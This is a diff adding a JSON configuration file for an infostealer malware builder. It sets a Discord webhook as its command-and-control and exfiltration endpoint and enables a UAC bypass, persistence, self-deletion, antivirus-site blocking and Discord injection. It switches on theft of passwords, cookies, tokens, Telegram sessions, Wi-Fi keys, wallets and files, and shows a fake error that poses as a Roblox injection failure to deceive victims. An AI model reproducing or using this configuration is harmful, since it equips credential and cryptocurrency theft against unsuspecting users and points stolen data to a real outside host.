@@ -1,0 +1,44 @@
+{
+    "settings": {
+        "c2": [
+            0,
+            "https://discord.com/api/webhooks/1167245969025413140/EHd-hwf_bMkZUpPVY4J8HBTse4CSAco2hjCvXM1nWV2s-I9WcBk4S7QxK4Q6le-n7Ahe"
+        ],
+        "mutex": "o8TjdV3xJas8vqzh",
+        "pingme": true,
+        "vmprotect": true,
+        "startup": true,
+        "melt": true,
+        "uacBypass": true,
+        "archivePassword": "zeno",
+        "consoleMode": 0,
+        "debug": false,
+        "pumpedStubSize": 0,
+        "boundFileRunOnStartup": false
+    },
+    "modules": {
+        "captureWebcam": false,
+        "capturePasswords": true,
+        "captureCookies": true,
+        "captureHistory": true,
+        "captureAutofills": true,
+        "captureDiscordTokens": true,
+        "captureGames": true,
+        "captureWifiPasswords": true,
+        "captureSystemInfo": true,
+        "captureScreenshot": true,
+        "captureTelegramSession": true,
+        "captureCommonFiles": true,
+        "captureWallets": true,
+        "fakeError": [
+            true,
+            [
+                "Fluster",
+                "Error 9812867231973.dll unable to inject roblox",
+                48
+            ]
+        ],
+        "blockAvSites": true,
+        "discordInjection": true
+    }
+}
